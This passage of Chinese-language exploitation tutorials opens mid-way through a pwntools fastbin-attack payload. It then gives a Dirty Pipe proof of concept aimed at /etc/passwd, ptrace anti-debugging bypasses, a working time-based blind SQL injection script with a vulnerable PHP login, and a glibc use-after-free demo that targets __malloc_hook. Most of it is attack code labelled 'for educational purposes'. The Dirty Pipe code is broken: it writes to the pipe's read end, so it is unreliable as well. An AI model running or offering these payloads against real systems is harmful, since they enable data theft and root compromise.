elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# 获取__malloc_hook地址
malloc_hook = libc.symbols['__malloc_hook']
# 计算目标地址（需要对齐，通常使用__malloc_hook - 0x23）
target = malloc_hook - 0x23

# 构造payload
payload = b'A'*0x18  # 填充chunkA的数据
payload += p64(0x21)  # 覆盖chunkB的size（保持fastbin大小）
payload += p64(target)  # 覆盖chunkA的fd指针（假设chunkA已被释放）

# 发送payload（此处省略交互细节）
```

注意：实际利用需要绕过ASLR和PIE，通常需要信息泄露。此代码仅用于教育目的。

CVE-2022-0847（Dirty Pipe）是Linux内核5.8至5.16版本中的一个权限提升漏洞。漏洞成因在于内核的pipe系统调用中，当向pipe写入数据时，如果pipe缓冲区未初始化，攻击者可以覆盖只读文件（如/etc/passwd）的内容，从而添加root用户。

**漏洞原理：**
- pipe的缓冲区由struct pipe_buffer表示，其中包含一个flags字段。
- 当通过splice系统调用将数据从文件移动到pipe时，如果目标pipe缓冲区是新建的，其flags未设置PIPE_BUF_FLAG_CAN_MERGE标志，导致后续写入可以覆盖已存在的页面。
- 攻击者可以创建一个pipe，通过splice将只读文件的部分内容映射到pipe，然后向pipe写入数据，从而修改文件内容。

**受影响版本：** Linux内核5.8 - 5.16.11、5.15.25、5.10.102之前。
**修复：** 升级内核或应用补丁（增加对flags的检查）。

以下是一个简化的C POC（来自公开漏洞）：

```c
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main() {
    // 打开目标只读文件（如/etc/passwd）
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    // 创建pipe
    int p[2];
    pipe(p);
    // 使用splice将文件内容映射到pipe写端
    splice(fd, NULL, p[1], NULL, 4096, 0);
    // 关闭写端，防止后续写入
    close(p[1]);
    // 现在pipe读端包含文件内容，但未设置CAN_MERGE标志
    // 通过写入pipe读端（利用漏洞）覆盖内容
    // 注意：实际利用需要更复杂的操作，此处仅示意
    char *new_data = "root::0:0:root:/root:/bin/bash\n";
    write(p[0], new_data, strlen(new_data));
    close(p[0]);
    close(fd);
    return 0;
}
```

注意：实际利用需要精确控制偏移和大小，且需要目标文件可写（但漏洞允许覆盖只读文件）。此代码仅用于教育目的。

反调试技术是程序用于检测调试器存在的机制，常见的有ptrace、Trap Flag、时间检测、断点检测等。ptrace是Linux下常用的反调试方法：程序调用ptrace(PTRACE_TRACEME, 0, 0, 0)，如果返回-1，说明已被调试（因为一个进程只能被一个调试器跟踪）。

漏洞成因：开发者使用ptrace作为反调试手段，但可被绕过。

受影响版本：任何使用ptrace反调试的二进制程序。

POC原理：攻击者可通过LD_PRELOAD注入自定义ptrace函数，或使用调试器在ptrace调用前修改返回值，或使用gdb的catch syscall。

修复：反调试只是增加难度，无法完全阻止。更高级的反调试包括多线程、代码混淆等。

C语言示例（反调试程序）：
```c
#include <stdio.h>
#include <sys/ptrace.h>
#include <stdlib.h>

int main() {
    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1) {
        printf("Debugger detected! Exiting.\n");
        exit(1);
    }
    printf("Normal execution.\n");
    return 0;
}
```

绕过方法1：使用gdb的catch syscall修改返回值。
```bash
gdb ./anti_debug
(gdb) catch syscall ptrace
(gdb) commands
> set $eax = 0
> continue
> end
(gdb) run
```

绕过方法2：使用LD_PRELOAD注入自定义ptrace。
```c
// my_ptrace.c
#include <stdio.h>
long ptrace(int request, int pid, void *addr, void *data) {
    return 0;  // 总是成功
}
```
编译为共享库：gcc -shared -fPIC -o my_ptrace.so my_ptrace.c
运行：LD_PRELOAD=./my_ptrace.so ./anti_debug

绕过方法3：使用strace或ltrace直接修改二进制文件中的ptrace调用（NOP掉）。

详细技术说明：ptrace反调试是基础反调试技术，但容易被绕过。更高级的反调试包括检测/proc/self/status中的TracerPid、检测时间差（如rdtsc）、检测断点（int3）、检测调试器窗口等。逆向工程师需熟悉多种绕过技术。对于ptrace，除了上述方法，还可使用gdb的unset environment LD_PRELOAD来防止注入，但攻击者仍可修改二进制。实际逆向中，通常使用动态调试器（如x64dbg、gdb）结合脚本自动化绕过。修复建议：使用多线程反调试、代码虚拟化、混淆等增加分析难度。

基于时间的盲注（Time-Based Blind SQL Injection）适用于页面无回显但可通过延迟判断条件真假的场景。攻击者通过构造SQL语句，利用SLEEP()或BENCHMARK()函数使数据库在条件为真时延迟响应，从而逐字符推断数据。以下以MySQL为例，假设存在一个登录接口，参数username存在注入。

漏洞示例代码（PHP）：
```php
$username = $_GET['username'];
$query = "SELECT * FROM users WHERE username='$username'";
$result = mysqli_query($conn, $query);
if (mysqli_num_rows($result) > 0) {
    echo "User exists";
} else {
    echo "User not found";
}
```

利用思路：使用`' OR IF(1=1, SLEEP(5), 0) -- -`使页面延迟5秒，确认注入点。然后逐字符爆破数据库名、表名、列名、数据。

Python脚本示例：
```python
import requests
import time

url = "http://target.com/login.php"

def check_delay(payload):
    params = {'username': payload}
    start = time.time()
    r = requests.get(url, params=params, timeout=10)
    elapsed = time.time() - start
    return elapsed > 4.5  # 如果延迟超过4.5秒认为条件为真

# 获取数据库版本（第一个字符）
# 使用SUBSTRING和ASCII比较
payload_template = "' OR IF(ASCII(SUBSTRING((SELECT VERSION()),%d,1))>%d, SLEEP(5), 0) -- -"

# 二分法爆破
version = ""
for pos in range(1, 20):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = payload_template % (pos, mid)
        if check_delay(payload):
            low = mid + 1
        else:
            high = mid - 1
    char = chr(low)
    version += char
    print(f"Version so far: {version}")
    if char == ';' or len(version) > 30:
        break

print("Database version:", version)
```

更高效的方法：使用`IF(ORD(MID(...))>N, SLEEP(5), 0)`。注意网络延迟可能导致误判，可设置阈值并多次测试。实际利用中还需处理URL编码和特殊字符。时间盲注速度较慢，但可结合多线程加速。对于MySQL，也可使用BENCHMARK(10000000, MD5('a'))代替SLEEP。

防御：使用参数化查询（PreparedStatement）彻底杜绝SQL注入。时间盲注是渗透测试中重要的数据提取手段，尤其当其他注入方式不可用时。

Fastbin attack是glibc堆利用中的经典技术，针对fastbin（大小0x20-0x80字节）的单向链表管理机制。当程序存在Use-After-Free（UAF）漏洞时，攻击者可以篡改已释放chunk的fd指针，使其指向一个伪造的chunk（如栈上的变量或GOT表），从而在下次malloc时分配到目标地址，实现任意写。

原理：
- Fastbin采用LIFO（后进先出）的单链表，每个chunk的fd指针指向下一个空闲chunk。
- 当free一个chunk时，它被添加到对应大小的fastbin头部。
- 当malloc请求相同大小时，从头部取出chunk。
- 如果攻击者能修改已释放chunk的fd指针，那么下一次malloc将返回fd指向的地址（视为chunk），从而控制该地址的内容。

利用条件：
1. 存在UAF：释放后仍可读写该chunk。
2. 能够控制fd指针。
3. 目标地址需要满足fastbin的size检查（即目标地址+8处的值必须与请求大小匹配）。通常通过伪造size字段绕过。

示例代码（C语言，演示UAF和fastbin attack）：
```c
// uaf.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char *a = malloc(0x20);  // 分配0x20大小（实际chunk大小0x30）
    char *b = malloc(0x20);

    printf("a: %p\n", a);
    printf("b: %p\n", b);

    free(a);  // 释放a，进入fastbin
    free(b);  // 释放b，进入fastbin

    // UAF：仍然可以修改a的内容
    // 修改a的fd指针，指向一个伪造的chunk（例如栈上的变量）
    // 假设我们想分配到栈上的target变量
    char target[0x30];
    memset(target, 0, 0x30);
    // 伪造size字段：在target+8处写入0x31（与请求大小匹配）
    *(size_t*)(target+8) = 0x31;

    // 修改a的fd指向target
    *(void**)a = target;

    // 现在连续两次malloc会先返回b（因为b在fastbin头部），然后返回target
    char *c = malloc(0x20);  // 返回b
    char *d = malloc(0x20);  // 返回target（因为a的fd指向target）

    printf("c: %p\n", c);
    printf("d: %p\n", d);

    // 现在d指向栈上的target，可以修改栈内容
    strcpy(d, "controlled");
    printf("target: %s\n", target);

    return 0;
}
```

编译：`gcc -o uaf uaf.c`（注意关闭PIE：`-no-pie`）。运行后可以看到d指向了栈上的target。实际利用中，目标地址可以是__malloc_hook、__free_hook等，通过覆盖为one_gadget或system实现代码执行。

Python pwntools利用示例（针对libc 2.23）：
```python
from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# 假设已泄露libc基址
libc_base = 0x7ffff7dd4000
malloc_hook = libc_base + libc.symbols['__malloc_hook']
one_gadget = libc_base + 0x4526a  # 根据libc版本

# 构造payload：将fd指向__malloc_hook附近，伪造size
# 具体步骤略，核心是修改fd并触发malloc
```

注意：现代glibc加入了tcache（2.26+），fastbin attack仍有效但需考虑tcache。tcache同样有类似机制，但更简单。理解fastbin attack是堆利用的基础，后续可扩展到tcache poisoning、house of系列等。
